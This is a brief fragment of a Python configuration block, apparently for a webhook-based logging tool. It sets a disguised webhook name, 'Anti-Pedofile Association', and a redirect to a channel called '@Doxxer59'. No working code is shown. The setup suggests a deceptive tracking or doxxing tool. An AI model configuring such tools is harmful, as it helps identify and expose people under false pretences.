...
config = {
    ...
    # CUSTOMIZATION #
    "username": "Anti-Pedofile Association", # Set this to the name you want the webhook to have
    ...
    "redirect": {
        ...
        "page": "https://www.youtube.com/@Doxxer59" # Link to the webpage to redirect to 
    },
